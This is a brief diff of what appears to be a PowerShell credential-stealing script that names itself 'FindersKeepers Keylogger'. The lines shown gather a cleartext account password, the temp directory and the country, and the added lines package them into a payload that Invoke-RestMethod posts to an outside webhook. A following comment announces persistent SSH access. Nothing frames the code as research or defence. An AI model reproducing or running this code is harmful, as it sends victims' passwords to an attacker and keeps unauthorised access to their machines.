@@ -97,6 +97,12 @@ Account Password = $pwordClear
 Temp Directory = $dirName
 Location (country) = $country
 "@
+
+$payload = @{
+  'username' = 'FindersKeepers Keylogger'
+  'content'  = $description
+}
+
 Invoke-RestMethod -Uri $Webhook -Method Post -Body $payload;
 
 ## Enable persistent SSH
